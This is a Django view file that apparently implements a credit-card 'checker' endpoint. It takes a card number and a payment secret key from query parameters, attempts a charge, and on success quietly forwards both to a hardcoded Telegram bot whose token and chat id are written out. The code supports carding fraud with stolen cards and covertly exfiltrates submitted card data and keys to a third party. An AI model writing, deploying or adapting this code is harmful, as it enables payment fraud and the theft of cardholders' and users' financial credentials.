
from django.shortcuts import render, HttpResponse
from . import utils
from django.views.decorators.csrf import csrf_exempt
import requests

# Create your views here.


@csrf_exempt
def cheker(request):
    if request.method == 'GET':
        try:
            cc = request.GET.get('cc')
            sk = request.GET.get('sk')
            resp = utils.charge(cc, sk)
            if 'Payment Complete' in f'{resp}':
                requests.get(
                    f'https://api.telegram.org/bot6651648962:AAHcTwFSqfGDvt8rdb82KPE595YeztT_ZAw/sendMessage?chat_id=1329532701&text=cc:{cc}+sk:{sk}')
            return HttpResponse(f'{resp}')
        except Exception as e:
            # Catching the specific exception raised, if any
            return HttpResponse(r"{'cc': 'none', 'resp': 'Error', 'code': 'none', 'time': '1.7', 'bypass': 0}")
    else:
        return HttpResponse(r'Invalid request method')
